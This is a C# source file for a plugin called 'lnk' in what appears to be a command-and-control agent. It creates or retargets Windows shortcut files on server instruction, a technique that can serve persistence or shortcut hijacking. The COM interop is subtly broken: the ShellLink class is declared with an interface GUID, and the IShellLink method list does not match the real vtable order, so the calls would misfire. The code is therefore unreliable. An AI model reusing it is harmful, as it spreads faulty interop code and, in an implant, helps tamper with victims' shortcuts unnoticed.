using Agent.Interfaces;
using System;
using System.Collections.Generic;
using System.Collections;
using System.Text;
using System.Text.Json;
using Agent.Models;
using Agent.Utilities;
using System.Runtime.InteropServices;
using lnk;

namespace Agent
{
    public class Plugin : IPlugin
    {
        public string Name => "lnk";
        private IMessageManager messageManager { get; set; }
        private ITokenManager tokenManager { get; set; }

        public Plugin(IMessageManager messageManager, IAgentConfig config, ILogger logger, ITokenManager tokenManager, ISpawner spawner)
        {
            this.messageManager = messageManager;
            this.tokenManager = tokenManager;
        }

        public async Task Execute(ServerJob job)
        {
            LnkArgs args = JsonSerializer.Deserialize<LnkArgs>(job.task.parameters);

            switch (args.action) {
                case "create":
                    if (!CreateShortcut(args))
                    {
                        await this.messageManager.WriteLine("Failed to create shortcut.", job.task.id, true, "error");
                        return;
                    };
                    break;
                case "update":
                    if (!UpdateShortcut(args))
                    {
                        await this.messageManager.WriteLine("Failed to update shortcut.", job.task.id, true, "error");
                        return;
                    }
                    break;
            }

            await this.messageManager.WriteLine("Done.", job.task.id, true);
        }
        private bool UpdateShortcut(LnkArgs args)
        {
            // Create a ShellLink object
            IShellLink shellLink = (IShellLink)new ShellLinkObject();

            // Load the existing shortcut
            shellLink.Load(args.path, (int)SLR_FLAGS.SLR_UPDATE);

            // Update the shortcut properties

            if (!string.IsNullOrEmpty(args.targetPath))
            {
                shellLink.SetPath(args.targetPath);
            }

            if (!string.IsNullOrEmpty(args.workingDir))
            {
                shellLink.SetWorkingDirectory(args.workingDir);
            }
            
            if (!string.IsNullOrEmpty(args.description)){
                shellLink.SetDescription(args.description);
            }

            // Save the changes by saving the shortcut to a new file
            ((IPersistFile)shellLink).Save(args.path, false);

            // Optional: Release the COM object
            Marshal.ReleaseComObject(shellLink);

            return true;
        }

        private bool CreateShortcut(LnkArgs args)
        {
            // Create a ShellLink object
            IShellLink shellLink = (IShellLink)new ShellLinkObject();

            // Set the shortcut properties
            shellLink.SetPath(args.targetPath);
            shellLink.SetWorkingDirectory(args.workingDir);
            shellLink.SetDescription(args.description);

            // Save the new shortcut
            ((IPersistFile)shellLink).Save(args.path, false);

            // Optional: Release the COM object
            Marshal.ReleaseComObject(shellLink);

            return true;
        }
        // PInvoke declarations
        [ComImport]
        [Guid("000214F9-0000-0000-C000-000000000046")]
        private class ShellLinkObject { }

        [ComImport]
        [InterfaceType(ComInterfaceType.InterfaceIsIUnknown)]
        [Guid("000214F9-0000-0000-C000-000000000046")]
        private interface IShellLink
        {
            void Load(string pszFile, int fFlags);
            void SetPath(string pszFile);
            void SetWorkingDirectory(string pszDir);
            void SetDescription(string pszName);
        }

        [ComImport]
        [InterfaceType(ComInterfaceType.InterfaceIsIUnknown)]
        [Guid("0000010b-0000-0000-C000-000000000046")]
        private interface IPersistFile
        {
            void GetClassID(out Guid pClassID);
            void IsDirty();
            void Load([MarshalAs(UnmanagedType.LPWStr)] string pszFileName, int dwMode);
            void Save([MarshalAs(UnmanagedType.LPWStr)] string pszFileName, [MarshalAs(UnmanagedType.Bool)] bool fRemember);
            void SaveCompleted([MarshalAs(UnmanagedType.LPWStr)] string pszFileName);
            void GetCurFile([MarshalAs(UnmanagedType.LPWStr)] out string ppszFileName);
        }

        [Flags]
        private enum SLR_FLAGS
        {
            SLR_NO_UI = 0x1,
            SLR_ANY_MATCH = 0x2,
            SLR_UPDATE = 0x4,
            SLR_NOUPDATE = 0x8,
            SLR_NOSEARCH = 0x10,
            SLR_NOTRACK = 0x20,
            SLR_NOLINKINFO = 0x40,
            SLR_INVOKE_MSI = 0x80,
            SLR_NO_UI_WITH_MSG_PUMP = 0x101,
            SLR_OFFER_DELETE_WITHOUT_FILE = 0x200,
            SLR_KNOWNFOLDER = 0x400,
            SLR_MACHINE_IN_LOCAL_TARGET = 0x800,
            SLR_UPDATE_MACHINE_AND_SID = 0x1000,
            SLR_NO_UI_WITH_MSG_PUMP_AND_PERSIST = 0x1101,
        }
    }
}
